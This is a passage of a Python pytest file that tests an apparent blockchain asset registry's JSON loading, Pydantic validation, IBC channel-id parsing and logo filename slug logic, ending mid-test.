    declared = [None, "string", 42, {"chain_name": "noble", "base_denom": "uusdc"}]
    result = _merge_images_with_declared_sync(
        declared_images=declared, computed=computed, base_url="https://ex/img"
    )

    # Only the valid dict produced an entry; None/string/42 were skipped.
    assert len(result) == 1
    assert result[0]["image_sync"] == {"chain_name": "noble", "base_denom": "uusdc"}


# ----------------
# Negative tests for _merge_images_with_declared_sync
# ----------------

def test_merge_images_with_declared_sync_empty_list_falls_back_to_computed() -> None:
    """Empty list [] behaves the same as None — falls back to the computed entry.

    'not []' is True in Python, so the early-return branch fires and computed is used.
    """

    computed = AssetImages(png="zig.png", svg=None)
    result = _merge_images_with_declared_sync(
        declared_images=[], computed=computed, base_url="https://ex/img"
    )

    # Same result as passing None — computed entry is returned.
    assert len(result) == 1
    assert result[0]["png"] == "https://ex/img/zig.png"


def test_merge_images_with_declared_sync_all_invalid_items_falls_back_to_computed() -> None:
    """When all declared items are non-dict, the out list is empty and computed is used as fallback."""

    computed = AssetImages(png="zig.png", svg=None)
    result = _merge_images_with_declared_sync(
        declared_images=["string", 42, None],
        computed=computed,
        base_url="https://ex/img",
    )

    # All declared items were skipped, so fallback to computed.
    assert len(result) == 1
    assert result[0]["png"] == "https://ex/img/zig.png"


def test_merge_images_with_declared_sync_shortcut_missing_base_denom_treated_as_full_form() -> None:
    """A dict with only chain_name (no base_denom) does not match the shortcut — treated as full form."""

    computed = AssetImages(png="usdc.png", svg=None)
    # Missing base_denom — shortcut condition requires BOTH chain_name AND base_denom.
    declared = [{"chain_name": "noble"}]
    result = _merge_images_with_declared_sync(
        declared_images=declared, computed=computed, base_url="https://ex/img"
    )

    assert len(result) == 1
    # Treated as full form: chain_name is preserved as-is (not wrapped in image_sync),
    # and computed png is filled in because 'png' was absent.
    assert "image_sync" not in result[0]
    assert result[0]["chain_name"] == "noble"
    assert result[0]["png"] == "https://ex/img/usdc.png"


def test_merge_images_with_declared_sync_shortcut_missing_chain_name_treated_as_full_form() -> None:
    """A dict with only base_denom (no chain_name) does not match the shortcut — treated as full form."""

    computed = AssetImages(png="usdc.png", svg=None)
    declared = [{"base_denom": "uusdc"}]
    result = _merge_images_with_declared_sync(
        declared_images=declared, computed=computed, base_url="https://ex/img"
    )

    assert len(result) == 1
    assert "image_sync" not in result[0]
    assert result[0]["base_denom"] == "uusdc"
    assert result[0]["png"] == "https://ex/img/usdc.png"


def test_merge_images_with_declared_sync_existing_image_sync_prevents_shortcut_conversion() -> None:
    """A dict with chain_name, base_denom AND image_sync is NOT re-wrapped — treated as full form.

    The shortcut condition requires 'image_sync' to be absent.  If it is already present,
    the item is treated as a full form entry and its existing image_sync is preserved.
    """

    computed = AssetImages(png="usdc.png", svg=None)
    declared = [
        {
            "chain_name": "noble",
            "base_denom": "uusdc",
            "image_sync": {"chain_name": "already-set", "base_denom": "already-set"},
        }
    ]
    result = _merge_images_with_declared_sync(
        declared_images=declared, computed=computed, base_url="https://ex/img"
    )

    assert len(result) == 1
    # Existing image_sync is kept; chain_name/base_denom are NOT re-wrapped.
    assert result[0]["image_sync"] == {"chain_name": "already-set", "base_denom": "already-set"}
    assert result[0]["chain_name"] == "noble"
    assert result[0]["png"] == "https://ex/img/usdc.png"


def test_merge_images_with_declared_sync_shortcut_extra_keys_are_dropped() -> None:
    """Extra keys in a shortcut form entry are silently dropped — only chain_name/base_denom go into image_sync."""

    declared = [{"chain_name": "noble", "base_denom": "uusdc", "extra_key": "should_be_dropped"}]
    result = _merge_images_with_declared_sync(
        declared_images=declared,
        computed=AssetImages(png=None, svg=None),
        base_url="https://ex/img",
    )

    assert len(result) == 1
    # image_sync only contains chain_name and base_denom — extra_key is silently discarded.
    assert result[0]["image_sync"] == {"chain_name": "noble", "base_denom": "uusdc"}
    assert "extra_key" not in result[0]


######################################################################
# Tests for read_json_files
######################################################################

def test_read_json_files_returns_list_from_mainnet_suffixed_files(
    tmp_path: Path,
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """read_json_files reads *.mainnet.json and returns a list of parsed payloads."""

    # Arrange: create one mainnet asset file
    tmp_path.mkdir(parents=True, exist_ok=True)
    (tmp_path / "zig.mainnet.json").write_text(
        json.dumps(valid_native_asset_payload, indent=2),
        encoding="utf-8",
    )

    # Act
    result = read_json_files(tmp_path)

    assert isinstance(result, list)
    assert len(result) == 1
    assert result[0]["asset_id"] == "zig"
    assert result[0]["network"] == "mainnet"
    # $schema is stripped from every payload before returning.
    assert "$schema" not in result[0]


def test_read_json_files_reads_testnet_suffixed_files(
    tmp_path: Path,
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """read_json_files reads *.testnet.json files just as it reads mainnet ones."""

    payload = {**valid_native_asset_payload, "network": "testnet", "asset_id": "zig-test"}
    (tmp_path / "zig.testnet.json").write_text(json.dumps(payload), encoding="utf-8")

    result = read_json_files(tmp_path)

    assert len(result) == 1
    assert result[0]["asset_id"] == "zig-test"
    assert result[0]["network"] == "testnet"


def test_read_json_files_mainnet_comes_before_testnet_in_output(
    tmp_path: Path,
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """Mainnet files always appear before testnet files — the two glob groups are concatenated in order."""

    mainnet = {**valid_native_asset_payload, "asset_id": "zig-main", "network": "mainnet"}
    testnet = {**valid_native_asset_payload, "asset_id": "zig-test", "network": "testnet"}
    (tmp_path / "zig.mainnet.json").write_text(json.dumps(mainnet), encoding="utf-8")
    (tmp_path / "zig.testnet.json").write_text(json.dumps(testnet), encoding="utf-8")

    result = read_json_files(tmp_path)

    assert len(result) == 2
    # Mainnet entry must come first regardless of filename alphabetical order.
    assert result[0]["network"] == "mainnet"
    assert result[1]["network"] == "testnet"


def test_read_json_files_mainnet_files_sorted_alphabetically(
    tmp_path: Path,
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """Within the mainnet group, files are sorted alphabetically by filename."""

    a = {**valid_native_asset_payload, "asset_id": "a_asset", "network": "mainnet"}
    b = {**valid_native_asset_payload, "asset_id": "b_asset", "network": "mainnet"}
    # Write b first to confirm sort is by name, not write order.
    (tmp_path / "b_asset.mainnet.json").write_text(json.dumps(b), encoding="utf-8")
    (tmp_path / "a_asset.mainnet.json").write_text(json.dumps(a), encoding="utf-8")

    result = read_json_files(tmp_path)

    # a_asset.mainnet.json sorts before b_asset.mainnet.json — a_asset must be first.
    assert result[0]["asset_id"] == "a_asset"
    assert result[1]["asset_id"] == "b_asset"


def test_read_json_files_schema_key_is_stripped(tmp_path: Path) -> None:
    """$schema is removed from every payload — it is an editor hint with no runtime meaning."""

    payload = {"$schema": "https://example.com/schema.json", "asset_id": "zig", "network": "mainnet"}
    (tmp_path / "zig.mainnet.json").write_text(json.dumps(payload), encoding="utf-8")

    result = read_json_files(tmp_path)

    assert len(result) == 1
    # $schema must be gone; the rest of the payload must be intact.
    assert "$schema" not in result[0]
    assert result[0]["asset_id"] == "zig"


def test_read_json_files_dedupes_by_asset_id_and_network(
    tmp_path: Path,
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """read_json_files de-duplicates by (asset_id, network); first file alphabetically wins."""

    # Write two files with identical (asset_id, network) — a.mainnet.json sorts first.
    first = {**valid_native_asset_payload, "symbol": "FIRST"}
    second = {**valid_native_asset_payload, "symbol": "SECOND"}
    (tmp_path / "a.mainnet.json").write_text(json.dumps(first), encoding="utf-8")
    (tmp_path / "b.mainnet.json").write_text(json.dumps(second), encoding="utf-8")

    result = read_json_files(tmp_path)

    # Only one entry — the alphabetically-first file wins.
    assert len(result) == 1
    assert result[0]["symbol"] == "FIRST"


def test_read_json_files_same_asset_id_different_network_both_kept(
    tmp_path: Path,
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """Same asset_id on mainnet and testnet are NOT deduped — the key is (asset_id, network)."""

    mainnet = {**valid_native_asset_payload, "network": "mainnet"}
    testnet = {**valid_native_asset_payload, "network": "testnet"}
    (tmp_path / "zig.mainnet.json").write_text(json.dumps(mainnet), encoding="utf-8")
    (tmp_path / "zig.testnet.json").write_text(json.dumps(testnet), encoding="utf-8")

    result = read_json_files(tmp_path)

    # Both entries survive because (zig, mainnet) != (zig, testnet).
    assert len(result) == 2
    # Collect the "network" value from each result dict into a list.
    networks = []
    for r in result:
        networks.append(r["network"])

    assert "mainnet" in networks
    assert "testnet" in networks


def test_read_json_files_unicode_content_is_read_correctly(tmp_path: Path) -> None:
    """UTF-8 encoded files with unicode characters are read and preserved correctly."""

    payload = {"asset_id": "tokené", "network": "mainnet", "name": "中文名字"}
    (tmp_path / "token.mainnet.json").write_text(json.dumps(payload), encoding="utf-8")

    result = read_json_files(tmp_path)

    assert len(result) == 1
    # Unicode characters must survive the round-trip through json.load.
    assert result[0]["asset_id"] == "tokené"
    assert result[0]["name"] == "中文名字"



def test_read_json_files_empty_dir_returns_empty_list(tmp_path: Path) -> None:
    """read_json_files returns [] when the directory has no *.mainnet.json or *.testnet.json."""

    result = read_json_files(tmp_path)

    assert result == []


def test_read_json_files_plain_json_file_is_ignored(
    tmp_path: Path,
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """A file named *.json (without mainnet/testnet suffix) is not read.

    Only *.mainnet.json and *.testnet.json match the glob patterns.
    """

    # Write both a plain .json and a valid .mainnet.json.
    (tmp_path / "zig.json").write_text(json.dumps(valid_native_asset_payload), encoding="utf-8")
    (tmp_path / "other.mainnet.json").write_text(
        json.dumps({**valid_native_asset_payload, "asset_id": "other"}), encoding="utf-8"
    )

    result = read_json_files(tmp_path)

    # Only other.mainnet.json was read — zig.json was ignored.
    assert len(result) == 1
    assert result[0]["asset_id"] == "other"


def test_read_json_files_subdirectory_files_not_scanned(
    tmp_path: Path,
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """Files inside subdirectories are NOT read — glob is flat, not recursive.

    This is intentional: each asset type directory (native/, factory/, ibc/) is
    flat.  A file in a subdirectory would be silently skipped with no error.
    """

    sub = tmp_path / "subdir"
    sub.mkdir()
    # A valid file inside a subdirectory — must NOT appear in results.
    (sub / "nested.mainnet.json").write_text(
        json.dumps(valid_native_asset_payload), encoding="utf-8"
    )

    result = read_json_files(tmp_path)

    # The subdirectory file is invisible to the flat glob.
    assert result == []


######################################################################
# Tests for load_assets
######################################################################

def _write_load_asset_file(directory: Path, filename: str, payload: dict) -> None:
    """Write *payload* as JSON to *directory*/*filename*, creating dir if needed."""
    directory.mkdir(parents=True, exist_ok=True)
    (directory / filename).write_text(json.dumps(payload), encoding="utf-8")


# ----------------
# Positive tests for load_assets
# ----------------


def test_load_assets_returns_three_lists_when_tmp_paths_exist(
    tmp_path: Path,
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """load_assets reads assets/native, assets/factory, assets/ibc and returns (natives, factories, ibcs)."""

    # Arrange: create assets/native, assets/factory, assets/ibc with at least one mainnet file in native
    root = tmp_path
    (root / "assets" / "native").mkdir(parents=True)
    (root / "assets" / "factory").mkdir(parents=True)
    (root / "assets" / "ibc").mkdir(parents=True)
    (root / "assets" / "native" / "zig.mainnet.json").write_text(
        json.dumps(valid_native_asset_payload, indent=2),
        encoding="utf-8",
    )

    # Act
    natives, factories, ibcs = load_assets(root)

    # Assert
    assert isinstance(natives, list)
    assert isinstance(factories, list)
    assert isinstance(ibcs, list)
    assert len(natives) == 1
    assert len(factories) == 0
    assert len(ibcs) == 0
    assert natives[0].asset_id == "zig"
    assert natives[0].network == "mainnet"


def test_load_assets_empty_dirs_return_three_empty_lists(tmp_path: Path) -> None:
    """load_assets returns ([], [], []) when asset dirs exist but have no *.mainnet.json or *.testnet.json."""

    # Arrange: create empty asset dirs (no JSON files)
    root = tmp_path
    (root / "assets" / "native").mkdir(parents=True)
    (root / "assets" / "factory").mkdir(parents=True)
    (root / "assets" / "ibc").mkdir(parents=True)

    # Act
    natives, factories, ibcs = load_assets(root)

    # Assert
    assert natives == []
    assert factories == []
    assert ibcs == []

def test_load_assets_native_result_is_native_asset_instance(
    tmp_path: Path,
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """Each native JSON file is returned as a NativeAsset instance, not a raw dict."""
    _write_load_asset_file(tmp_path / "assets" / "native", "zig.mainnet.json", valid_native_asset_payload)

    natives, _, _ = load_assets(tmp_path)

    assert isinstance(natives[0], NativeAsset)


def test_load_assets_factory_result_is_factory_asset_instance(
    tmp_path: Path,
    valid_factory_asset_payload: dict[str, Any],
) -> None:
    """Each factory JSON file is returned as a FactoryAsset instance with its fields populated."""
    _write_load_asset_file(tmp_path / "assets" / "factory", "panda.mainnet.json", valid_factory_asset_payload)

    _, factories, _ = load_assets(tmp_path)

    assert len(factories) == 1
    assert isinstance(factories[0], FactoryAsset)
    assert factories[0].subdenom == "panda"


def test_load_assets_ibc_result_is_ibc_asset_instance(
    tmp_path: Path,
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """Each IBC JSON file is returned as an IBCAsset instance with its fields populated."""
    _write_load_asset_file(tmp_path / "assets" / "ibc", "usdc.mainnet.json", valid_ibc_asset_payload)

    _, _, ibcs = load_assets(tmp_path)

    assert len(ibcs) == 1
    assert isinstance(ibcs[0], IBCAsset)
    assert ibcs[0].origin_denom == "uusdc"


def test_load_assets_routes_each_type_to_its_own_list(
    tmp_path: Path,
    valid_native_asset_payload: dict[str, Any],
    valid_factory_asset_payload: dict[str, Any],
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """Assets in all three directories are loaded independently into their own typed lists."""
    _write_load_asset_file(tmp_path / "assets" / "native", "zig.mainnet.json", valid_native_asset_payload)
    _write_load_asset_file(tmp_path / "assets" / "factory", "panda.mainnet.json", valid_factory_asset_payload)
    _write_load_asset_file(tmp_path / "assets" / "ibc", "usdc.mainnet.json", valid_ibc_asset_payload)

    natives, factories, ibcs = load_assets(tmp_path)

    assert len(natives) == 1 and isinstance(natives[0], NativeAsset)
    assert len(factories) == 1 and isinstance(factories[0], FactoryAsset)
    assert len(ibcs) == 1 and isinstance(ibcs[0], IBCAsset)


def test_load_assets_multiple_files_per_dir_returns_multiple_instances(
    tmp_path: Path,
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """All files in a directory are loaded; alphabetical order from filenames is preserved."""
    # Two distinct native assets — a_asset sorts before b_asset alphabetically.
    a = {
        **valid_native_asset_payload,
        "asset_id": "atoken",
        "symbol": "AT",
        "base_denom": "uatoken",
        "denom_units": [{"denom": "uatoken", "exponent": 0}, {"denom": "atoken", "exponent": 6}],
    }
    b = {
        **valid_native_asset_payload,
        "asset_id": "btoken",
        "symbol": "BT",
        "base_denom": "ubtoken",
        "denom_units": [{"denom": "ubtoken", "exponent": 0}, {"denom": "btoken", "exponent": 6}],
    }
    # Write b first to confirm ordering comes from filename sort, not write order.
    _write_load_asset_file(tmp_path / "assets" / "native", "b.mainnet.json", b)
    _write_load_asset_file(tmp_path / "assets" / "native", "a.mainnet.json", a)

    natives, _, _ = load_assets(tmp_path)

    # Both assets are returned; alphabetical order from read_json_files is preserved.
    assert len(natives) == 2
    assert natives[0].asset_id == "atoken"
    assert natives[1].asset_id == "btoken"


def test_load_assets_return_value_is_3_tuple_of_lists(
    tmp_path: Path,
) -> None:
    """load_assets returns a 3-tuple of lists that can be unpacked as natives, factories, ibcs."""
    (tmp_path / "assets" / "native").mkdir(parents=True)
    (tmp_path / "assets" / "factory").mkdir(parents=True)
    (tmp_path / "assets" / "ibc").mkdir(parents=True)

    result = load_assets(tmp_path)

    # Must be a tuple with exactly three elements.
    assert isinstance(result, tuple)
    assert len(result) == 3
    # Unpack so each variable is named
    natives, factories, ibcs = result
    assert isinstance(natives, list)
    assert isinstance(factories, list)
    assert isinstance(ibcs, list)


# ----------------
# Negative tests for load_assets
# ----------------

def test_load_assets_invalid_json_in_file_raises(
    tmp_path: Path,
) -> None:
    """load_assets raises when an asset file contains invalid JSON."""

    # Arrange: a mainnet file with invalid JSON
    root = tmp_path
    (root / "assets" / "native").mkdir(parents=True)
    (root / "assets" / "factory").mkdir(parents=True)
    (root / "assets" / "ibc").mkdir(parents=True)
    (root / "assets" / "native" / "zig.mainnet.json").write_text(
        "{ invalid json }",
        encoding="utf-8",
    )

    with pytest.raises(json.JSONDecodeError) as excinfo:
        # load_assets calls json.load internally; malformed JSON raises JSONDecodeError.
        load_assets(root)

    # Assert the error message describes a JSON syntax problem.
    assert "Expecting property name enclosed in double quotes" in str(excinfo.value)


def test_load_assets_native_missing_required_field_raises_validation_error(
    tmp_path: Path,
) -> None:
    """A native file missing a required field raises ValidationError.

    NativeAsset requires base_denom; omitting it is caught when the file is loaded.
    This can happen when a developer hand-edits a file and forgets a required key.
    """
    from pydantic import ValidationError

    # base_denom and denom_units intentionally omitted.
    payload = {
        "network": "mainnet",
        "asset_id": "zig",
        "type": "native",
        "symbol": "ZIG",
        "name": "ZIGChain Native Token",
        "decimals": 6,
        "display_denom": "ZIG",
    }
    _write_load_asset_file(tmp_path / "assets" / "native", "zig.mainnet.json", payload)

    with pytest.raises(ValidationError) as exc:
        load_assets(tmp_path)

    check_model_error(
        errors=exc,
        expected_errors=[
            {"loc": ("base_denom",), "type": "missing"},
            {"loc": ("denom_units",), "type": "missing"},
        ],
    )


def test_load_assets_extra_field_in_factory_raises_validation_error(
    tmp_path: Path,
    valid_factory_asset_payload: dict[str, Any],
) -> None:
    """A factory file with an unrecognised field raises ValidationError.

    Happens when a developer adds a field to a JSON file before adding it to the model.
    """
    from pydantic import ValidationError

    # Add a field that does not exist in FactoryAsset.
    payload = {**valid_factory_asset_payload, "unknown_field": "surprise"}
    _write_load_asset_file(tmp_path / "assets" / "factory", "panda.mainnet.json", payload)

    with pytest.raises(ValidationError) as exc:
        load_assets(tmp_path)

    check_model_error(
        errors=exc,
        expected_errors=[
            {"loc": ("unknown_field",), "type": "extra_forbidden"},
        ],
    )



def test_load_assets_factory_file_in_native_dir_raises_validation_error(
    tmp_path: Path,
    valid_factory_asset_payload: dict[str, Any],
) -> None:
    """A file placed in the wrong directory raises ValidationError due to type mismatch.

    A factory asset has type='factory'; NativeAsset expects type='native', so it fails.
    Prevents a developer mistake from silently loading an asset as the wrong type.
    """
    from pydantic import ValidationError

    _write_load_asset_file(tmp_path / "assets" / "native", "panda.mainnet.json", valid_factory_asset_payload)

    with pytest.raises(ValidationError) as exc:
        load_assets(tmp_path)

    check_model_error(
        errors=exc,
        expected_errors=[
            {"loc": ("type",), "type": "literal_error", "msg": "Input should be 'native'"},
        ],
    )


######################################################################
# Tests for parse_channel_id_from_path
######################################################################

# ----------------
# Positive tests for parse_channel_id_from_path
# ----------------


def test_parse_channel_id_from_path_returns_channel_id() -> None:
    """parse_channel_id_from_path extracts channel id from transfer/channel-X/... paths."""

    # Act
    result = parse_channel_id_from_path("transfer/channel-3/uusdc")

    # Assert
    assert result == "channel-3"


@pytest.mark.parametrize(
    "path,expected",
    [
        ("transfer/channel-0/denom", "channel-0"),
        ("transfer/channel-175/uatom", "channel-175"),
    ],
)
def test_parse_channel_id_from_path_various_paths(path: str, expected: str) -> None:
    """parse_channel_id_from_path returns the channel segment for valid transfer paths."""

    result = parse_channel_id_from_path(path)
    assert result == expected


# ----------------
# Negative tests for parse_channel_id_from_path
# ----------------


@pytest.mark.parametrize(
    "path",
    [
        "",
        "transfer",
        "x/y/z",
        "not-transfer/channel-3/foo",
    ],
)
def test_parse_channel_id_from_path_invalid_returns_none(path: str) -> None:
    """parse_channel_id_from_path returns None when path is not transfer/<channel>/... ."""

    result = parse_channel_id_from_path(path)
    assert result is None


######################################################################
# Tests for _slugify_for_filename
######################################################################


@pytest.mark.parametrize("value, expected", [
    ("ZIG",          "zig"),           # uppercase
    ("  USDC  ",     "usdc"),          # outer whitespace
    ("chain-name",   "chain-name"),    # hyphen kept
    ("a_b",          "a_b"),           # underscore kept
    ("abc123",       "abc123"),        # digits kept
    ("ABC-123_def",  "abc-123_def"),   # mixed case
    ("USDCoin",      "usdcoin"),       # camelCase
    ("noble-USDC",   "noble-usdc"),    # hyphen + case
    ("abc.png",      "abcpng"),        # dot removed
    ("path/to/file", "pathtofile"),    # slash removed
    ("hello world",  "helloworld"),    # internal space
    ("abc!@#$%",     "abc"),           # special chars
    ("123",          "123"),           # digits only
    ("zig",          "zig"),           # already valid
    ("ibc:uusdc",    "ibcuusdc"),      # colon removed
])
def test_slugify_for_filename_lowercases_and_keeps_alnum(value: str, expected: str) -> None:
    """_slugify_for_filename lowercases, strips whitespace, and removes chars outside [a-z0-9-_]."""

    assert _slugify_for_filename(value) == expected


######################################################################
# Tests for _slug_from_logo_uri
######################################################################


# ----------------
# Positive tests for _slug_from_logo_uri
# ----------------


def test_slug_from_logo_uri_extracts_stem_from_path() -> None:
    """_slug_from_logo_uri returns the lowercased filename stem from a PNG logo URL."""

    result = _slug_from_logo_uri("https://example.com/images/zigchain.png")
    assert result == "zigchain"


def test_slug_from_logo_uri_svg_extension_returns_slug() -> None:
    """An SVG URL produces the same slug as a PNG — the extension is stripped by Path.stem."""

    result = _slug_from_logo_uri("https://example.com/logos/USDCoin.svg")
    assert result == "usdcoin"


def test_slug_from_logo_uri_query_string_is_ignored() -> None:
    """Query parameters in the URL do not affect the slug — urlparse strips them before Path.name.

    GitHub raw URLs often include ?ref=main or similar — this is a realistic input.
    """
    result = _slug_from_logo_uri(
        "https://raw.githubusercontent.com/chain/logos/USDCoin.png?ref=main"
    )
    assert result == "usdcoin"


def test_slug_from_logo_uri_no_file_extension_uses_full_filename() -> None:
    """A URL with no file extension returns the full filename as the slug via Path.stem."""

    result = _slug_from_logo_uri("https://example.com/logos/zigchain")
    assert result == "zigchain"


def test_slug_from_logo_uri_multi_dot_filename_dots_stripped() -> None:
    """A filename with multiple dots (e.g. USD.Coin.png) has its stem slugified — dots removed.

    Path.stem of 'USD.Coin.png' is 'USD.Coin'; _slugify_for_filename then strips the dot.
    """
    result = _slug_from_logo_uri("https://example.com/logos/USD.Coin.png")
    assert result == "usdcoin"


# ----------------
# Negative tests for _slug_from_logo_uri
# ----------------


def test_slug_from_logo_uri_none_or_empty_returns_none() -> None:
    """_slug_from_logo_uri returns None for None or empty URI."""

    assert _slug_from_logo_uri(None) is None
    assert _slug_from_logo_uri("") is None


def test_slug_from_logo_uri_domain_only_returns_none() -> None:
    """A URL with no path component returns None — Path('').name is empty.

    urlparse('https://example.com').path is '' so Path.name is also ''.
    """
    assert _slug_from_logo_uri("https://example.com") is None


def test_slug_from_logo_uri_root_slash_returns_none() -> None:
    """A URL ending in just '/' returns None — Path('/').name is empty."""

    assert _slug_from_logo_uri("https://example.com/") is None



######################################################################
# Tests for locate_image_filenames
######################################################################


def test_locate_image_filenames_finds_png_when_exists(tmp_path: Path) -> None:
    """locate_image_filenames returns AssetImages with png when file exists in logos_dir."""

    (tmp_path / "zig.png").write_text("x", encoding="utf-8")
    result = locate_image_filenames(slugs=["zig", "ZIG"], logos_dir=tmp_path)
    assert result.png == "zig.png"
    assert result.svg is None


def test_locate_image_filenames_finds_both_png_and_svg(tmp_path: Path) -> None:
    """When both png and svg exist for first matching slug, both are returned."""

    (tmp_path / "usdc.png").write_text("x", encoding="utf-8")
    (tmp_path / "usdc.svg").write_text("x", encoding="utf-8")
    result = locate_image_filenames(slugs=["usdc"], logos_dir=tmp_path)
    assert result.png == "usdc.png"
    assert result.svg == "usdc.svg"


def test_locate_image_filenames_finds_svg_only_when_only_svg_exists(tmp_path: Path) -> None:
    """When only the SVG file exists, png is None and svg is set."""

    (tmp_path / "zig.svg").write_text("x", encoding="utf-8")

    result = locate_image_filenames(slugs=["zig"], logos_dir=tmp_path)

    assert result.png is None
    assert result.svg == "zig.svg"


def test_locate_image_filenames_slugify_applied_to_raw_slug(tmp_path: Path) -> None:
    """Raw slugs are slugified before path construction — uppercase is lowercased.

    The function calls _slugify_for_filename on each raw value, so passing 'ZIG'
    constructs 'zig.png', not 'ZIG.png'. The file zig.png is found correctly.
    """
    (tmp_path / "zig.png").write_text("x", encoding="utf-8")

    # Only the uppercase slug is given — slugify must lower it to find the file.
    result = locate_image_filenames(slugs=["ZIG"], logos_dir=tmp_path)

    assert result.png == "zig.png"
    assert result.svg is None


def test_locate_image_filenames_returns_first_matching_slug(tmp_path: Path) -> None:
    """The loop stops at the first slug that has a matching file — later slugs are not tried.

    Both atom.png and zig.png exist, but atom is first in the slug list, so it wins.
    """
    (tmp_path / "atom.png").write_text("x", encoding="utf-8")
    (tmp_path / "zig.png").write_text("x", encoding="utf-8")

    result = locate_image_filenames(slugs=["atom", "zig"], logos_dir=tmp_path)

    # atom is tried first and matches — zig is never reached.
    assert result.png == "atom.png"


def test_locate_image_filenames_skips_to_next_slug_when_first_has_no_file(tmp_path: Path) -> None:
    """When the first slug has no matching file, the loop continues to the next slug.

    This is the fallback behaviour — the candidate list comes from _asset_logo_slugs
    which orders slugs by preference (logo_uri stem first, then asset_id, display_denom, symbol).
    """
    (tmp_path / "zig.png").write_text("x", encoding="utf-8")

    # 'atom' has no file; 'zig' is the fallback that matches.
    result = locate_image_filenames(slugs=["atom", "zig"], logos_dir=tmp_path)

    assert result.png == "zig.png"


def test_locate_image_filenames_no_match_returns_empty_asset_images(tmp_path: Path) -> None:
    """When no slug matches any file, returns AssetImages(png=None, svg=None)."""

    result = locate_image_filenames(slugs=["nonexistent"], logos_dir=tmp_path)
    assert result.png is None
    assert result.svg is None



def test_locate_image_filenames_empty_slug_list_returns_empty_asset_images(tmp_path: Path) -> None:
    """An empty slug list skips the loop entirely and returns AssetImages(png=None, svg=None)."""

    result = locate_image_filenames(slugs=[], logos_dir=tmp_path)

    assert result.png is None
    assert result.svg is None


@pytest.mark.parametrize("raw_slug", [
    "!!!",      # all special chars
    "   ",      # whitespace only
    "...",      # dots only
])
def test_locate_image_filenames_slug_that_slugifies_to_empty_is_skipped(
    tmp_path: Path,
    raw_slug: str,
) -> None:
    """A raw slug that produces an empty string after slugify is skipped via continue.

    The next slug in the list is tried instead. This guards against any raw string
    that contains only characters stripped by _slugify_for_filename.
    """
    (tmp_path / "zig.png").write_text("x", encoding="utf-8")

    # The bad slug is first; zig is the valid fallback.
    result = locate_image_filenames(slugs=[raw_slug, "zig"], logos_dir=tmp_path)

    # The bad slug was skipped; zig.png was found on the next iteration.
    assert result.png == "zig.png"


######################################################################
# Tests for _declared_logo_slug
######################################################################


# ----------------
# Positive tests for _declared_logo_slug
# ----------------


def test_declared_logo_slug_returns_png_slug_from_png_uri() -> None:
    """When asset has logo_uris with a png URL, returns the slugified filename stem."""

    asset = SimpleNamespace(logo_uris=SimpleNamespace(
        png="https://example.com/logos/logo.png",
        svg=None,
    ))
    assert _declared_logo_slug(asset) == "logo"


def test_declared_logo_slug_png_wins_when_both_png_and_svg_set() -> None:
    """When both png and svg are set, the PNG slug is returned — SVG is never tried.

    The expression is: _slug_from_logo_uri(str(png_uri)) or _slug_from_logo_uri(str(svg_uri)).
    A truthy PNG slug short-circuits the 'or', so the SVG side is never evaluated.
    PNG and SVG use deliberately different filenames so the assertion proves png won.
    """
    asset = SimpleNamespace(logo_uris=SimpleNamespace(
        png="https://example.com/logos/png-logo.png",   # slug → "png-logo"
        svg="https://example.com/logos/svg-logo.svg",   # slug → "svg-logo"
    ))
    assert _declared_logo_slug(asset) == "png-logo"  # svg-logo would mean svg won


def test_declared_logo_slug_falls_back_to_svg_when_png_uri_gives_no_slug() -> None:
    """When the png URI produces no slug, the SVG URI is used as fallback.

    _slug_from_logo_uri returns None for a URL with no filename (e.g. domain-only).
    The 'or' then evaluates the SVG side and returns its slug.
    """
    asset = SimpleNamespace(logo_uris=SimpleNamespace(
        png="https://example.com/",  # no filename → _slug_from_logo_uri returns None
        svg="https://example.com/logos/zig.svg",
    ))
    assert _declared_logo_slug(asset) == "zig"


# ----------------
# Negative tests for _declared_logo_slug
# ----------------


def test_declared_logo_slug_returns_none_when_no_logo_uris() -> None:
    """When asset has no logo_uris attribute at all, getattr returns None and returns None."""

    asset = SimpleNamespace(asset_id="zig")
    assert _declared_logo_slug(asset) is None


@pytest.mark.parametrize("logo_uris_value", [
    None,   # Optional field not set — the common case for assets without a logo_uris block
    False,  # any other falsy value — guards against unexpected falsy assignment
])
def test_declared_logo_slug_returns_none_for_falsy_logo_uris(logo_uris_value: object) -> None:
    """Any falsy logo_uris value triggers the 'if not logo_uris' guard and returns None."""

    asset = SimpleNamespace(logo_uris=logo_uris_value)
    assert _declared_logo_slug(asset) is None


######################################################################
# Tests for _asset_logo_slugs
######################################################################


def test_asset_logo_slugs_declared_slug_is_first_in_list() -> None:
    """When logo_uris.png is set, its slug appears before asset_id in the result."""

    asset = SimpleNamespace(
        logo_uris=SimpleNamespace(png="https://example.com/special.png", svg=None),
        asset_id="zigchain",
        display_denom="Zig",
        symbol="ZIG",
    )
    result = _asset_logo_slugs(asset)
    # declared slug comes from logo_uris.png → "special"
    assert result[0] == "special"
    assert result == ["special", "zigchain", "zig"]


def test_asset_logo_slugs_ibc_asset_id_excluded_due_to_slash() -> None:
    """IBC asset_id containing '/' is excluded; only display_denom and symbol remain."""

    asset = SimpleNamespace(
        logo_uris=None,
        asset_id="ibc/HASH123",  # slash → excluded
        display_denom="usdc",
        symbol="USDC",
    )
    result = _asset_logo_slugs(asset)
    assert result == ["usdc"]  # asset_id skipped, display and symbol dedupe to one


def test_asset_logo_slugs_factory_asset_id_excluded_due_to_dot() -> None:
    """Factory asset_id containing '.' is excluded; only display_denom and symbol remain."""

    asset = SimpleNamespace(
        logo_uris=None,
        asset_id="coin.x.panda",  # dot → excluded
        display_denom="panda",
        symbol="PANDA",
    )
    result = _asset_logo_slugs(asset)
    assert result == ["panda"]  # asset_id skipped, display and symbol dedupe to one


def test_asset_logo_slugs_deduplication_preserves_first_occurrence() -> None:
    """When display_denom and symbol slugify to the same string, only the first is kept."""

    asset = NativeAsset(
        network="mainnet",
